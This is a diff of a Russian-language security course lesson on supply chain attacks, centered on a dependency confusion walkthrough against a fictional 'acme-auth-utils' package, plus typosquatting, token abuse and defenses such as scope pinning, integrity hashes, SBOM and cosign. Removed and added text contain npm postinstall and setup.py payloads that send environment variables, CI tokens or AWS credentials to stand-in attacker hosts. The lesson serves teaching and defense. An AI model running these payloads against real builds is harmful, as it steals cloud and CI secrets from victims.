@@ -14,197 +14,161 @@ useful_for:
 estimated_minutes: 45
 summary: "Цепочка поставки — это доверие к чужому коду и артефактам. Разбираем dependency confusion, typosquatting, компрометацию инструментов сборки, злоупотребление publish-токенами, а также защиту через SBOM и подписи."
 ---
+## Задача
 
-Облачные организации собирают софт из сотен сторонних пакетов и инструментов. Цепочка поставки — это всё доверие между вашим кодом и чужим. Скомпрометировав один пакет или один пайплайн, атакующий получает код внутри периметра жертвы. Урок — про атаки и защиту.
+Мы уже знаем, что CI/CD-пайплайн — доверенный исполнитель с секретами (см. `cloud-cicd-secrets`). Но откуда в пайплайне вообще берётся код, которому доверяют? Из репозитория и из **сторонних пакетов** — готовых библиотек, которые ставятся автоматически.
 
-## Модель угроз supply chain
+**Цепочка поставки** (supply chain) — это всё доверие между твоим кодом и чужим: зависимости, инструменты сборки, реестры пакетов. Задача урока — показать, как один подложенный пакет даёт выполнение кода внутри периметра жертвы и путь к облачным ключам. Разберём это на конкретном репозитории.
 
-Классические векторы:
+## Данные: публичный репозиторий и его lock-файл
 
-- **Dependency confusion** — внутренний пакет с тем же именем публикуется в публичном реестре.
-- **Typosquatting** — имя похоже на популярное (`reqeusts` вместо `requests`).
-- **Компрометация maintainer** — захват аккаунта автора пакета (как event-stream/`flatmap-stream`).
-- **Вредоносные install-скрипты** — `postinstall` в npm, `setup.py` в PyPI, `build.rs` в Cargo.
-- **Компрометация CI** — подмена сборки, кэша, артефактов.
-- **Злоупотребление publish-токенами** — утёкший `NPM_TOKEN`/`PYPI_TOKEN`.
+У цели есть открытый репозиторий. Смотрим зависимости — файл `package.json` и его «замороженную» копию `package-lock.json`.
 
-| Вектор | Где проявляется | Что даёт атакующему |
-|--------|-----------------|---------------------|
-| Dependency confusion | `npm install <internal-name>` | Код на CI/разработчике |
-| Typosquatting | `npm install`, `pip install` | То же, но пассивно |
-| postinstall | npm-пакет | RCE при установке |
-| Compromised maintainer | любой реестр | RCE в тысячах проектов |
-| CI cache poisoning | пайплайн | Подмена артефакта деплоя |
+`package-lock.json` — это **lock-файл**: он фиксирует точные версии и адреса, откуда качаются пакеты, чтобы сборка была воспроизводимой.
 
-## Dependency confusion: как это работает
-
-Сценарий: компания использует внутренний реестр (Artifactory/Nexus/Private PyPI) и **не закрепляет** внутренние пакеты за приватным scope. Инструмент сборки сначала спросит приватный реестр, а если пакета нет — публичный.
-
-```bash
-# Разведка: имена внутренних пакетов утекают из кода, SBOM, CI-логов
-grep -rE '"(dependencies|devDependencies)"' package.json
-grep -rn 'index-url\|extra-index-url' pip.conf setup.cfg
-# Утечки имён: SBOM, package-lock.json, .npmrc, комментарии
+```
+$ grep -o '"resolved": "[^"]*"' package-lock.json | grep -v registry.npmjs.org | head
+"resolved": "https://nexus.acme.local/repository/npm/acme-auth-utils/-/acme-auth-utils-1.2.0.tgz"
 ```
 
-Атакующий публикует в публичном реестре пакет с **более высокой версией**, чем внутренний:
+Строка `resolved` говорит: пакет `acme-auth-utils` берётся из **внутреннего** реестра `nexus.acme.local`. Значит, у компании есть приватная библиотека с таким именем. Это уже утечка: атакующий узнал имя внутреннего пакета.
 
-```bash
-# Публикуем в npm пакет с тем же именем и version 9999.0.0
-npm publish --access public
-# Теперь `npm install internal-lib` на CI подтянет ПУБЛИЧНЫЙ пакет
+## Пробуем в лоб: а имя-то защищено?
+
+Первый вопрос атакующего: зарегистрировано ли это имя в **публичном** npm? Если да — confusion не сработает, сборка возьмёт приватный пакет. Проверяем:
+
+```
+$ npm view acme-auth-utils version --registry=https://registry.npmjs.org
+npm error 404 Not Found - GET https://registry.npmjs.org/acme-auth-utils
 ```
 
-Проверка уязвимости (защита):
+404. Имя `acme-auth-utils` в публичном реестре свободно. Это и есть окно для атаки.
 
-```bash
-# Явно задать scope и registry для приватных пакетов в .npmrc
-# @company:registry=https://nexus.company.local/repository/npm/
-# Проверить, что internal-пакеты не резолвятся из public
-npm view <internal-name> --registry=https://registry.npmjs.org
-```
+## Приём: dependency confusion
 
-## Вредоносные install-скрипты
+**Dependency confusion** («путаница зависимостей») — атака, при которой атакующий публикует в публичном реестре пакет с именем внутреннего. Механизм: если сборка НЕ закрепляет внутренние имена за приватным scope, инструмент (npm, pip) сначала спрашивает публичный реестр, а туда уже залит пакет с более высокой версией.
 
-Даже без confusion пакет может выполнить код при установке.
+Почему версия важна: резолвер выбирает **наибольшую подходящую версию**. Публикуем `acme-auth-utils@99.0.0` — и `npm install` предпочтёт её внутренней `1.2.0`.
+
+Готовим вредоносный пакет. Ключевой трюк — **`postinstall`**: это npm-хук, скрипт, который выполняется автоматически сразу после установки пакета.
 
 ```json
-// package.json вредоносного пакета
 {
+  "name": "acme-auth-utils",
+  "version": "99.0.0",
   "scripts": {
-    "postinstall": "node -e \"require('https').get('https://attacker/'+Buffer.from(JSON.stringify(process.env)).toString('base64'))\""
+    "postinstall": "curl -s -d \"$(env | base64 -w0)\" https://attacker.example/x"
   }
 }
 ```
 
-```python
-# setup.py вредоносного PyPI-пакета
-from setuptools import setup
-import os, urllib.request
-urllib.request.urlopen("https://attacker/?env=" + os.environ.get("CI_JOB_TOKEN",""))
-setup(name="typo-name", version="0.0.1")
+Публикуем его:
+
+```
+$ npm publish --access public
++ acme-auth-utils@99.0.0
 ```
 
-Защита: `npm install --ignore-scripts`, `pip install --no-build-isolation` не поможет — используйте allowlist, `npm audit signatures`, lock-файлы.
+Всё. Дальше ждём, пока чья-то сборка обновит зависимости.
 
-## Компрометация CI и злоупотребление publish-токенами
+## Полный прогон: от свободного имени до облачных ключей
 
-Publish-токены часто лежат в CI-секретах. Утёкший токен = публикация от имени организации.
+1. **Разведка.** Имя внутреннего пакета утекло из `package-lock.json` (бывает ещё в SBOM, логах CI, комментариях).
+2. **Проверка.** `npm view acme-auth-utils` → 404, имя свободно.
+3. **Публикация.** Заливаем `acme-auth-utils@99.0.0` с `postinstall` в публичный npm.
+4. **Сборка.** Разработчик или CI добавляет зависимость, lock обновляется, `npm install` тянет версию `99.0.0`.
+5. **Срабатывание.** `postinstall` исполняется в контексте сборки и отправляет всё окружение нам.
+6. **Переход к облаку.** В окружении CI лежат `AWS_ACCESS_KEY_ID`/`AWS_SECRET_ACCESS_KEY` или `CI_JOB_TOKEN`. Проверяем добытое:
 
-```bash
-# Проверка npm-токена
-curl -H "Authorization: Bearer $NPM_TOKEN" https://registry.npmjs.org/-/whoami
-# PyPI: загрузка через twine
-TWINE_USERNAME=__token__ TWINE_PASSWORD=$PYPI_TOKEN twine upload dist/*
+```
+$ AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... aws sts get-caller-identity
+{
+  "Account": "123456789012",
+  "Arn": "arn:aws:iam::123456789012:role/ci-deploy"
+}
 ```
 
-Типичные утечки: `.npmrc` с `_authToken` в репозитории, токен в логах CI, токен в Docker-образе. Ищите:
+Мы внутри облака, не тронув ни одной уязвимости в самом приложении. Именно это делает supply chain таким опасным: доверие к чужому коду — это доверие к облаку.
 
-```bash
-grep -rE '_authToken|NPM_TOKEN|PYPI_TOKEN|CARGO_REGISTRY' . --hidden
-docker history <image> | grep -i token
+## Соседние векторы: typosquatting и захват maintainer
+
+Confusion — не единственный путь. Рядом живут:
+
+- **Typosquatting** — публикуется пакет с опечаткой в популярном имени: `reqeusts` вместо `requests`, `crossenv` вместо `cross-env`. Жертва сама ставит его по ошибке.
+- **Захват maintainer** — атакующий получает доступ к аккаунту автора пакета и добавляет вредоносную версию в легитимную библиотеку (так было с `event-stream`/`flatmap-stream`).
+- **Компрометация publish-токена** — утёкший `NPM_TOKEN`/`PYPI_TOKEN` позволяет публиковать от имени организации.
+
+Publish-токены часто лежат прямо в CI-секретах. Проверить утёкший npm-токен просто:
+
+```
+$ curl -s -H "Authorization: Bearer $NPM_TOKEN" https://registry.npmjs.org/-/whoami
+{"username":"acme-ci"}
 ```
 
-## Разобранный пример: от утёкшего имени пакета до RCE на CI
+Ищите токены так:
 
-**Дано:** публичный репозиторий, в `package-lock.json` виден приватный пакет `acme-auth-utils`.
-
-1. Проверяем, зарегистрирован ли он публично: `npm view acme-auth-utils` → 404.
-2. Публикуем `acme-auth-utils@99.0.0` с `postinstall`, который шлёт `CI_JOB_TOKEN` и переменные окружения на наш сервер.
-3. Ждём следующий `npm ci` на CI (lock-файл обновят при добавлении зависимости) → получаем токены пайплайна.
-4. Из токена CI — переход к облаку (см. `cloud-cicd-secrets`).
-
-Ключевой момент: **lock-файл может защитить**, если в нём зафиксирован `resolved` URL приватного реестра и integrity-хэш. Если нет — confusion срабатывает.
-
-## Защита: SBOM, подписи, SLSA, pinned versions
-
-- **SBOM** (CycloneDX/SPDX) — инвентарь зависимостей; нужен, чтобы знать, что у вас внутри.
-- **Подпись артефактов** — Sigstore/cosign, GPG, in-toto.
-- **SLSA** — уровни гарантий сборки (1–4), защита от подмены пайплайна.
-- **Pinned versions + integrity** — `package-lock.json`, `poetry.lock`, хэши.
-- **Allowlist реестров** — запрет публичного резолва внутренних имён.
-
-```bash
-# Генерация SBOM
-syft packages dir:. -o cyclonedx-json > sbom.json
-# Проверка подписи образа
-cosign verify --key cosign.pub <registry>/<image>:<tag>
-# Скан на уязвимые зависимости
-grype sbom:sbom.json
+```
+$ grep -rE '_authToken|NPM_TOKEN|PYPI_TOKEN' . --hidden
+./.npmrc://registry.npmjs.org/:_authToken=npm_XXXX
 ```
 
-## Частые ошибки
+## Защита: что реально ломает атаку
 
-- **Доверять lock-файлу, не проверяя `resolved`.** Lock можно отравить, если URL указывает на публичный реестр.
-- **Забыть про dev-зависимости.** Они исполняются на CI, но не попадают в прод-артефакт.
-- **Игнорировать install-скрипты.** `postinstall`/`preinstall` — прямой RCE-канал.
-- **Хранить publish-токены в репозитории.** `.npmrc` с `_authToken` — частая утечка.
-- **Не проверять подписи.** Без verify любой образ можно подменить.
-- **Считать, что «мы не используем публичный npm».** Транзитивные зависимости всё равно оттуда.
+- **Привязка к scope + registry.** В `.npmrc`: `@acme:registry=https://nexus.acme.local/...`. Тогда внутренние имена физически не ищутся в публичном реестре.
+- **Integrity-хэши в lock.** Если в lock зафиксирован `resolved` на приватный URL и `integrity`-хэш, подмена публичным пакетом не пройдёт.
+- **SBOM** (Software Bill of Materials) — машинный инвентарь всех зависимостей, чтобы знать, что внутри.
+- **Подписи артефактов** — Sigstore/cosign и SLSA-уровни (см. `cloud-supply-chain-sbom`).
+- **`npm ci --ignore-scripts`** — отключает install-хуки, но ломает легитимные пакеты; на практике это компромисс.
 
-## Что дальше / решение
+## Защита глубже: SBOM, подписи, SLSA
 
-- Нашли внутреннее имя пакета без публичной регистрации → проверяйте confusion.
-- Нашли publish-токен → проверяйте права на публикацию.
-- Нашли CI с install-скриптами → смотрите, какие env-переменные доступны скриптам.
-- Смежные уроки: `cloud-cicd-secrets`, `cloud-terraform`, `cloud-cloudformation`, `cloud-artifact-registry`.
+Три инструмента закрывают цепочку поставки системно.
 
-## Модель угроз supply chain
+**SBOM** (Software Bill of Materials) — машинный «состав» продукта: список всех компонентов и версий. Генерируется автоматически:
 
-Атакуется путь «исходники → сборка → артефакт → деплой». Точки: зависимости (npm/pypi), CI/CD, registry, подпись. Цель — выполнить код на этапе сборки (доступ к секретам) или внедрить backdoor в артефакт.
-
-## Dependency confusion
-
-Если внутренний пакет (`@company/utils`) отсутствует в публичном registry, а resolver не приоритизирует приватный — атакующий публикует пакет с тем же именем и версией выше. Установщик тянет публичный пакет. Проверка: посмотреть `.npmrc`/`pip.conf` и порядок registry.
-
-```bash
-npm view @company/utils versions   # публичный пакет существует?
-pip index versions company-utils
+```
+$ syft packages dir:. -o cyclonedx-json > sbom.json
+$ jq '.components | length' sbom.json
+214
 ```
 
-## Вредоносные install-скрипты
+214 компонентов. Теперь видно, что реально внутри, — по SBOM можно мгновенно проверить, затронул ли тебя свежий инцидент с пакетом.
 
-`postinstall` (npm), `setup.py` (pip) выполняются при установке. Вредоносный пакет крадёт env, `~/.aws`, токены CI.
+**Подписи артефактов** (Sigstore/cosign) — криптографическая гарантия, что артефакт собран тем, кем заявлено, и не подменён:
 
-```json
-{"scripts":{"postinstall":"curl -d @/root/.aws/credentials http://attacker/"}}
+```
+$ cosign verify --key cosign.pub registry.example.com/app:v1
+Verified OK
 ```
 
-## Разобранный пример: от утёкшего имени пакета до RCE на CI
+**SLSA** (Supply-chain Levels for Software Artifacts) — уровни гарантий сборки от 1 до 4. Чем выше, тем сложнее подменить пайплайн или артефакт: SLSA требует, чтобы сборка шла из подписанного источника по неизменяемому пайплайну. Проверка подписи и уровня — то, что отделяет «доверяю на слово» от «проверяю криптографически».
 
-1. В логах CI видим имя внутреннего пакета.
-2. Он отсутствует в публичном registry.
-3. Публикуем пакет с тем же именем и `postinstall`.
-4. Следующая сборка тянет его → выполняется код → креды CI уходят наружу.
-5. Через креды CI — облачный доступ.
+## Если не сработало
 
-## Защита
+- **Внутренние имена в приватном scope** (`@acme/...`) — публичный резолв исключён, confusion не работает.
+- **Lock с `integrity`** — публичный пакет отвергнут по хэшу.
+- **`--ignore-scripts`** — код не выполнится при установке, хотя данные могут утечь позже.
+- **Имя уже занято публично** — придётся искать другой вектор (typosquatting, захват maintainer).
 
-SBOM, подписи (sigstore), SLSA-уровни, pinned versions и хэши (lockfiles), приоритет приватных registry, изоляция сборки, сканирование зависимостей (trivy, grype, socket.dev).
+## Что мы теперь знаем
 
-## Частые ошибки
+1. Supply chain — это доверие к чужому коду на этапе сборки.
+2. Dependency confusion эксплуатирует публичный резолв внутреннего имени.
+3. `postinstall` (npm) и `setup.py` (pip) — прямой канал выполнения кода.
+4. Сборка — доверенный контекст с облачными секретами.
+5. Защита — scope+registry, integrity, SBOM, подписи.
 
-- Lockfile без integrity-хэшей.
-- Отсутствие приоритета приватного registry.
-- Доверие к `latest`.
-- Нет мониторинга новых публикаций внутренних имён.
+## На что смотреть дальше
 
-## Прокси для перехвата сборки
-
-Если сборка идёт через внутренний прокси-registry, атакующий, контролирующий прокси, может подменять пакеты на лету (MITM). Это сложнее, чем dependency confusion, но и незаметнее. Защита — TLS с пиннингом, подписанные пакеты и проверка целостности (lockfile с хэшами). Проверьте, ходят ли сборки в публичный registry напрямую или через прокси.
-
-## Быстрая проверка
-
-```bash
-npm view @company/utils versions
-pip index versions company-utils
-grep -r postinstall package.json
-gitleaks detect --source .
-```
-
-Проверьте, публикуется ли внутреннее имя пакета, есть ли install-скрипты и не утекли ли токены публикации. Dependency confusion начинается с этих трёх проверок.
+- `.npmrc`/`pip.conf` — куда указывает приватный реестр и есть ли приоритет.
+- `postinstall`/`preinstall`/`setup.py` в свежих зависимостях.
+- `resolved` в lock-файлах — приватный URL или публичный.
+- Утёкшие publish-токены: `_authToken`, `NPM_TOKEN`, `PYPI_TOKEN`.
+- Имена внутренних пакетов, светящиеся в SBOM, логах CI и Dockerfile.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "В чём суть dependency confusion?"
@@ -214,7 +178,7 @@ gitleaks detect --source .
     - "Меняется версия Node.js"
     - "Отключается TLS"
   answer: 0
-  explanation: "Приоритет публичного реестра над приватным и есть confusion."
+  explanation: "Публичный резолв внутреннего имени и есть confusion."
 - question: "Какой механизм npm выполняет код сразу при установке?"
   options:
     - "postinstall-скрипт"
@@ -223,6 +187,14 @@ gitleaks detect --source .
     - "peerDependencies"
   answer: 0
   explanation: "postinstall/preinstall выполняются при install."
+- question: "Почему атакующему важна строка resolved в package-lock.json?"
+  options:
+    - "Она показывает, из какого реестра берётся пакет, и выдаёт имена внутренних зависимостей"
+    - "Она хранит пароль npm"
+    - "Она задаёт версию Node.js"
+    - "Она шифрует пакет"
+  answer: 0
+  explanation: "resolved раскрывает приватный реестр и внутренние имена."
 - question: "Что такое SBOM?"
   options:
     - "Инвентарь компонентов ПО и их зависимостей"
@@ -231,28 +203,24 @@ gitleaks detect --source .
     - "Протокол шифрования"
   answer: 0
   explanation: "Software Bill of Materials перечисляет всё, что внутри."
-- question: "Чем SLSA помогает цепочке поставки?"
+- question: "Какая настройка ломает dependency confusion для внутреннего пакета?"
   options:
-    - "Задаёт уровни гарантий защищённости сборки"
-    - "Ускоряет сборку"
-    - "Шифрует исходники"
-    - "Заменяет CI"
+    - "Привязка внутреннего имени к приватному registry/scope"
+    - "Удаление lock-файла"
+    - "Отключение HTTPS"
+    - "Понижение версии npm"
   answer: 0
-  explanation: "SLSA — уровни гарантий сборки от подмены."
-- question: "Почему dev-зависимости опасны для supply chain?"
-  options:
-    - "Они исполняются на CI, хотя не попадают в прод-артефакт"
-    - "Они всегда вредоносны"
-    - "Они не устанавливаются"
-    - "Они зашифрованы"
-  answer: 0
-  explanation: "CI исполняет их в доверенном контексте с секретами."
+  explanation: "Если имя ищется только в приватном реестре, публичная публикация не сработает."
 ```
+
+## Куда дальше
+
+В следующем уроке (`cloud-artifact-registry`) мы спустимся на уровень ниже — к реестрам контейнерных образов, где тот же принцип «чужой артефакт внутри доверенного пайплайна» превращается в отравленный образ. А пока главное: если ты видишь свободное внутреннее имя пакета, светящееся в публичном репозитории, — это приглашение к атаке на всю цепочку поставки.
 
 ## Где пригодится
 
-- **Bug bounty:** уязвимости в пайплайнах и реестрах публичных организаций.
-- **Red team:** компрометация сборки как путь в периметр.
+- **Bug bounty:** уязвимые пайплайны и реестры публичных организаций.
+- **Red team:** компрометация сборки как вход в периметр.
 - **Пентест:** аудит CI/CD и зависимостей.
 - **Работа/DevSecOps:** внедрение SBOM, подписей, SLSA, allowlist реестров.
-- **Дальше по дереву:** `cloud-cicd-secrets`, `cloud-artifact-registry`.
+- **Дальше по дереву:** `cloud-artifact-registry`, `cloud-terraform`, `cloud-supply-chain-sbom`.
